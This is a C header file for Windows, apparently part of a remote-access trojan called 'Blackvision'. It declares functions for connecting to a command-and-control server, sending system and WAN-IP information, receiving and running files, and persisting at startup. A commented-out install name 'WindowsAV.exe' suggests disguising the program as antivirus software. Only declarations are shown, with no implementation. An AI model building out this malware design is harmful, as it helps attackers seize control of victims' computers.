#ifndef Blackvision_
#define Blackvision_

//#include "pch.h"
//#include <iostream>
//#include <winSock2.>
#include <windows.h>
#include <wininet.h>
#include <lmcons.h>
#include <tchar.h>
#include <stdio.h>
#include <stdbool.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winmm.lib")
#define BUFFER 1024
#define INTERVAL 5000
//#define INSTALLNAME "WindowsAV.exe" 


static bool connected = false;
// ZeroMemory < memset

void strsplit(char src[500], char* dest[5]);
void C2Connect(void);
void ConnectionManage(void);
void respond(const char* data);
void GetSysinfo(void);
void Wanip(void);
void recvFile(void);
void ExecuteFile(char* filename);
void startup(void);
void reconnect(void);

#endif
